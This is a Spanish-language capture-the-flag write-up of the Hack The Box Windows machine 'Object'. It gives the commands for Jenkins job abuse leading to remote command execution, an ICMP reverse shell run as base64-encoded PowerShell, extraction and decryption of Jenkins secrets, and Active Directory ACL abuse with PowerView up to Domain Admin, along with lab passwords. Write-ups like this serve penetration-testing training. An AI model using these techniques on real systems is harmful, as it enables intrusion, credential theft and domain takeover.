---
title:  "Object Writeup [ES] - HackTheBox"
date:   2022-03-14 13:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [hard, windows, active-directory, jenkins]
image:
  src: /images/HTB/Object/00-banner.png
  width: 620
  height: 410
---

# Resumen

[Object](https://app.hackthebox.com/machines/Object) es una máquina **Windows** de dificultad Hard de la plataforma de [Hack The Box](https://app.hackthebox.com/), incluye conceptos de explotación de Active Directory, Bypass de Firewall y ejecución de jobs en Jenkins.

![Info](/images/HTB/Object/01-info.png)

# Enumeración

## Rustscan - NMAP

Como siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará [Rustscan](https://github.com/RustScan/RustScan), proporcionando comandos de nmap para realizar el escaneo desde un one-liner.

* ```rustscan 10.129.96.147 -- -sCV | tee ports.tcp.nmap```

```plaintext
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.

Open 10.10.11.132:80
Open 10.10.11.132:5985
Open 10.10.11.132:8080

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    syn-ack Jetty 9.4.43.v20210629
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.43.v20210629)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
***

## HTTP/80

Lo primero que visualizamos es una web que nos indica el dominio ```object.htb``` en su pie de página y un enlace hacia su **automation server** que nos redirige hacia ```object.htb:8080```. Esto inmediatamente lo incorporamos al archivo ```/etc/hosts```.

![](/images/HTB/Object/10-website-80.png)

> En este punto intenté enumeración de directorios y de subdominios sin resultados satisfactorios.

***

## Jenkins - HTTP/8080

Bajo este puerto y la URL encontrada anteriormente, encontramos panel de inicio para Jenkins, el cual es un server para automatización y despliegue de tareas.

![](/images/HTB/Object/20-jenkins.png)

Como no poseemos credenciales, podemos intentar crear un nuevo user. Crearemos el usuario ```cervant:asd123```.

![](/images/HTB/Object/25-jenkins-create-user.png)

Iniciaremos sesión y vemos un enlace para crear un nuevo job.

![](/images/HTB/Object/30-jenkins-login.png)

Crearemos un job llamado **test** de tipo **Freestyle project** y le daremos OK.

![](/images/HTB/Object/32-jenkins-create-job.png)

Nos llevará a la siguiente página donde definiremos el detalle del job. Haremos scroll hacia abajo y la sección **Build** es la que nos interesa, ya que ahí es donde podremos inyectar comandos de Windows.


![](/images/HTB/Object/35-jenkins-build.png)

Se nos desplegará un cuadro de texto en donde podremos insertar nuestros comandos. Por ahora solo ejecutaremos un ```whoami``` para validar la correcta ejecución.

![](/images/HTB/Object/40-command-inject.png)

Al finalizar y guardar, nos dejará en el "home" de nuestro job, el problema es que en la sección izquierda el botón para ejecutar la tarea no se nos muestra. Esto puede ser debido a que no poseemos los permisos necesarios para una ejecución manual.

![](/images/HTB/Object/45-job-home.png)

Si volvemos a la configuración de la tarea, podemos ver una sección llamada **Build Triggers**. Acá vemos dos opciones que nos pueden servir:

- **Triger builds remotely**: Nos permitirá ejecutarlo remotamente utilizando un API-Token.
- **Build Periodically**: Permitirá la ejecución por calendarización (cron).

![](/images/HTB/Object/50-build-triggers.png)

### Ejecución remota de comandos (RCE)

Para ejecutar la tarea automáticamente cada 1 minuto, lo que tendríamos que hacer es agregar ```* * * * *```.

![](/images/HTB/Object/55-build-cron.png)

Pero esto resulta poco conveniente, ya que nos quita un poco de control. Por lo tanto, procederemos a crear un token y ejecutaremos el job remotamente desde consola.

Desde la configuración del Job habilitaremos **Triger builds remotely** y asignaremos un nombre de token.

![](/images/HTB/Object/60-build-token.png)

Posteriormente, iremos a la configuración de usuario y crearemos el token.

![](/images/HTB/Object/65-create-token.png)

Ya en tenencia del token, podremos ejecutar la tarea de la siguiente forma:

* ```http://[USERNAME]:[TOKEN]@[JENKINS-URL]/job/test/build?token=[TOKEN_NAME]```

En nuestro caso, lo gatillaremos desde consola utilizando ```curl```.

```bash
curl -s "http://cervant:11adc4716a1d0e300bdc2ae83b47c8bf14@object.htb:8080/job/test/build?token=CERVANT_TOKEN"
```

No se obtendrá output desde consola, pero inmediatamente veremos la tarea ejecutandose desde la interfaz web.

![](/images/HTB/Object/70-running-job.png)

Al cabo de unos segundos finalizará y podremos ir al detalle de la ejecución. Clicaremos sobre el número de tarea en el panel izquierdo e iremos a **Console Output**.

![](/images/HTB/Object/72-whoami-output.png)

Tenemos ejecución remota de comandos (RCE) con el usuario ```object\oliver```, en este momento podemos intentar obtener una reverse shell para entrar a la máquina.

Modificaremos el job y agregaremos una sentencia para obtener una consola utilizando netcat.

![](/images/HTB/Object/75-job-netcat.png)

Como siempre, compartiremos el binario desde la máquina local a través de **smbserver** de [impacket](https://github.com/SecureAuthCorp/impacket) e iniciaremos un listener.

![](/images/HTB/Object/78-listener.png)

Ejecutaremos la tarea nuevamente y veremos el output. En este caso, vemos que ha finalizado con un error, indicando que la ruta de red no fué encontrada.

![](/images/HTB/Object/80-running-job-failure.png)

Esto nos indica que hay alguna regla en el Firewall de la máquina **Object** que impide conexiones salientes, ya que en ningún momento se recibió una petición hacia el **smbserver**.

![](/images/HTB/Object/82-smbserver-without-request.png)

***

# Acceso a través de ICMP

Ya que sabemos que **TCP** se encuentra bloqueado y muy posiblemente para **UDP** también sea el caso, podriamos validar si tenemos traza **ICMP**. Asi que, nuevamente modificamos la tarea y la ejecutaremos para visualizar su output.

![](/images/HTB/Object/85-job-icmp.png)

Efectivamente tenemos conectividad a través de **ICMP**, por lo que, en lugar de enumerar el sistema a través de Jenkins, entablaremos una reverse shell utilizando este protocolo. En el repositorio de [Nishang](https://github.com/samratashok/nishang) podemos encontrar un script en powershell que hace exactamente esto. Especificamente nos interesa [Invoke-PowerShellIcmp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1) si que lo descargaremos y modificaremos.

## icmpsh

Ahora bien, seguimos teniendo el problema de que no podemos conectarnos a nuestra máquina para obtener el archivo de powershell para su ejecución. Para solucionar esto, convertiremos el contenido del archivo a base64 y lo ejecutaremos con ```powershell -enc [BASE64]``` directamente en el job de jenkins.

Para preparar la correcta ejecución del script, se debe hacer lo siguiente:

1. Ejecutar el comando ```sysctl -w net.ipv4.icmp_echo_ignore_all=1``` en nuestra máquina local.
2. Descargar la herramienta [icmpsh](https://github.com/inquisb/icmpsh) y ejecutarla para obtener el listener de la reverse shell.
3. Copiar la sentencia ```Invoke-PowerShellIcmp -IPAddress 10.10.14.89``` al final del script para lanzar la consola con una única ejecución.

![](/images/HTB/Object/87-prepare-icmp-shell.png)

![](/images/HTB/Object/88-prepare-icmp-shell.png)

Una vez esto se encuentra realizado, eliminaremos los comentarios y líneas vacías del script para compactar su contenido y encodearlo en **base64**.

```bash
cat icmp.ps1 | iconv -t utf-16le | base64 -w 0
```

![](/images/HTB/Object/90-encoded-shell.png)

Iremos al job en jenkins y actualizaremos el payload, lo ejecutaremos nuevamente con ```curl``` y al cabo de unos segundos obtendremos la shell.

> Importante notar que una shell a través de ICMP es significativamente más lenta que una tradicional.

![](/images/HTB/Object/97-getting-shell.png)

***

# Consola como Oliver

Una vez dentro, nos encontraremos en el directorio ```C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test```. Si volvemos al root de Jenkins podremos ubicar los archivos necesarios para descifrar las contraseñas de los usuarios creados. Para esto, requeriremos los archivos ```credentials.xml```, ```master.key``` y ```hudson.util.Secret```, el primero se encontrará en el directorio personal del usuario y los otros en el directorio **secret**.

![](/images/HTB/Object/105-jenkins-root.png)

En este caso nos interesan las credenciales del usuario admin.

![](/images/HTB/Object/102-jenkins-users.png)

Encontraremos el archivo ```config.xml``` el cual es equivalente a lo que necesitamos.

![](/images/HTB/Object/107-jenkins-admin-dir.png)

Para efectos de simplicidad, y considerando que el archivo ```hudson.util.Secret``` es un binario, extraeremos todo utilizando encoding en **base64** para luego "decodear" desde nuestra máquina..


* config.xml: 
  
```powershell
[convert]::ToBase64String((Get-Content -path users/admin_17207690984073220035/config.xml -Encoding byte))
```
* master.key: 

```powershell
[convert]::ToBase64String((Get-Content -path secrets/master.key -Encoding byte))
```
* hudson.util.Secret:
  
```powershell
[convert]::ToBase64String((Get-Content -path secrets/hudson.util.Secret -Encoding byte))
```

Para realizar el decrypt existen unas cuantas herramientas disponibles, una de ellas se encuentra programada en **Go** y pertenece al usuario [thesubtlety](https://github.com/thesubtlety). El repositorio en cuestión es [go-decrypt-jenkins](https://github.com/thesubtlety/go-decrypt-jenkins) desde donde descargaremos un binario compilado para linux.

Una vez descargado será muy fácil de utilizar.

![](/images/HTB/Object/110-all-files-decrypt.png)

![](/images/HTB/Object/115-jenkins-decrypt.png)

Introducimos todo lo necesario y obtendremos la contraseña del usuario **oliver**.

![](/images/HTB/Object/120-jenkins-decrypt.png)

```plaintext
oliver:c1cdfun_d2434
```

Con estas credenciales ya podemos ingresar utilizando [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

![](/images/HTB/Object/125-evil-winrm.png)

Para enumerar el sistema y descubrir una manera de escalar privlegios, utilizaremos **BloodHound**, pero primero debemos extraer la información desde la máquina. Para ello [Sharphound](https://github.com/BloodHoundAD/SharpHound/) en su versión de PowerShell viene de maravilla.

> Al momento de escribir este post, la versión de PowerShell de BloodHound no se encuentra disponible en su repositorio original, pero puede ser encontrada en los commits anteriores.

Subiremos el archivo con el comando ```upload``` nativo de **Evil-WinRM**, importaremos el módulo y lo ejecutaremos llamándo a la función ```Invoke-BloodHound -CollectionMethod All```. Generará un archivo comprimido con toda la data recolectada.

![](/images/HTB/Object/128-SharpHound.png)

Descargaremos el comprimido y lo importaremos a BloodHound para analizarlo.

## BloodHound

Una vez que ya se encuentra importado nuestro ```.zip```, lo primero será marcar **Oliver** como *Owned*.

![](/images/HTB/Object/130-oliver-bloodhound.png)

Posteriormente utilizaremos una de las consultas pre-construidas que contiene BloodHound: **Find Shortest Paths to Domain Admins**. Esto básicamente lo que hará será analizar posibles rutas para escalar privlegios y convertirnos en **Domain Admin** en base a la información obtenida del sistema.

![](/images/HTB/Object/135-path-to-domainAdmin.png)

Como se puede apreciar, nos entrega una ruta bastante directa en donde tendremos que pivotear a través de los usuarios **smith** y **maria** antes de llegar a Administrador de Dominio.

***

# Consola como Smith

La gráfica nos indica que para convertirnos en el usuario **smith** podemos abusar del permiso ```ForceChangePassword```. Para hacerlo, solamente debemos de ejecutar un simple comando, desde PowerShell sería de la siguiente manera:


```powershell
Set-ADAccountPassword -Identity smith -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "cerv123!" -Force)
```

Esto seteará la contraseña del usuario **smith** a ```cerv123!```, lo que nos permitirá ingresar con estas credenciales a través de WinRM.

![](/images/HTB/Object/138-change-password.png)

***

# Consola como Maria

## Logon script

![](/images/HTB/Object/140-smith-domain-path.png)

Ahora que tenemos acceso desde el usuario **smith**, lo siguiente que debemos hacer es buscar la forma de utilizar ```GenericWrite```. 

> **Nota:** BloodHound tiene integrado un panel de ayuda en donde se detalla como abusar de cada ACL, pero en este caso no nos será de utilidad.

Si revisamos en HackTricks veremos que hay una [sección](https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user) en donde se indica que es posible utilizar ```GenericWrite``` para insertar un **logon script**, el cual se ejecutará en cada inicio de sesión del usuario. Esto normalmente no funcionaría en un CTF, ya que se requiere que el usuario inicie sesión antes de que se ejecute nuestro script, pero en esta ocasión es distinto, ya que el usuario Maria se encuentra constantemente logueando el sistema.

Al revisar la información extraída con **SharpHound** se puede identificar que el último cambio de contraseña del user fué el 22 de Octubre de 2021, pero el último inicio de sesión data del 11 de Marzo 2022 (fecha actual al momento de escribir este writeup).

![](/images/HTB/Object/145-maria-logon.png)

Ahora que sabemos que este método es posible, desde el panel de ayuda de BloodHound podemos obtener el comando a ejecutar (con unas pequeñas modificaciones) para insertar nuestro script.

![](/images/HTB/Object/153-bloodhound-generic-help.png)

* ```Set-DomainObject -Identity [USER] -SET @{scriptpath='[SCRIPT-PATH]'}```

Verificamos que el usuario **maria** no posee ningún Logon Script configurado.

![](/images/HTB/Object/150-logon-script-info.png)

Crearemos nuestro script bajo el directorio Temp para no tener problemas de permisos y le insertaremos el siguiente contenido:

```plaintext
dir C:\Users\maria\Desktop > C:\Temp\Scripts\out.txt
```

Esto nos proporcionará una vía para leer directorios del usuario María, ya que no tenemos la capacidad de cambiar su contraseña o levantar una reverse shell debido a la restricciones de Firewall.

Pero antes, deberemos importar [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) ya que de otra manera no nos interpretará el comando. Entonces, los pasos a seguir serán:

* Subir script ```PowerView.ps1```.
* Importar su contenido.
* Ejecutar el comando de PowerShell.
   
```powershell
Set-ADObject -SamAccountName maria -PropertyName scriptpath -PropertyValue "C:\Temp\Scripts\pwn.ps1"
```
* Verificaremos que se agregó correctamente.

![](/images/HTB/Object/155-import-powerview.png)

## Enumeración de directorio

Al cabo de unos segundos veremos el archivo **out.txt** con el output del comando ```dir C:\Users\maria\Desktop```.

![](/images/HTB/Object/157-script-out.png)

Vemos el archivo **Engines.xls**, la idea será traerlo a nuestra máquina para inspeccionarlo. Para esto podemos convertirlo a **base64** y extraerlo, o bien, copiarlo a nuestra carpeta temporal y luego descargarlo.

![](/images/HTB/Object/159-download-engines.png)

## Credenciales

Abremos el archivo y veremos tres posibles credenciales.

![](/images/HTB/Object/161-engines-content.png)

Luego de validar las contraseñas contra **WinRM**, verificamos que ```W3llcr4ft3d_4cls``` es la correcta para **maria**.

![](/images/HTB/Object/165-shell-as-maria.png)

*** 

# Domain Admin

Ya que tenemos acceso como **maria**, sólo restaría abusar del ACL ```WriteOwner``` para obtener **Domain Admin**.

![](/images/HTB/Object/167-maria-to-domain.png)

Volveremos al directorio temporal creado anteriormente y haremos lo siguiente:

* Importar nuevamente PowerView.ps1.

```powershell
Import-Module .\PowerView.ps1
```

* Setear **maria** como propietario del grupo **Domain Admins**.

```powershell
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
```

* Garantizar todos los permisos a **maria** dentro del grupo **Domain Admins**.

```powershell
Add-DomainObjectAcl -PrincipalIdentity maria -TargetIdentity "Domain Admins" -Rights All
```

* Finalmente agregar a **maria** dentro del grupo Domain Admins.

```powershell
net group "Domain Admins" maria /add /domain
```

![](/images/HTB/Object/169-maria-domain-admin.png)

Ya en este punto tendríamos los privlegios máximos y estaría rooteada la máquina.

> **Nota:** Recordar que es necesario reiniciar la sesión para que se apliquen los nuevos permisos.

Como último paso buscaremos las flags.

```powershell
Get-ChildItem -Path C:\Users -Recurse -Include root.txt,user.txt | select Fullname
```

![](/images/HTB/Object/170-flags.png)

Esto sería todo para [Object](https://app.hackthebox.com/machines/Object).

![](/images/HTB/Object/200-pwned.png)

> ¡Happy Hacking and keep grinding!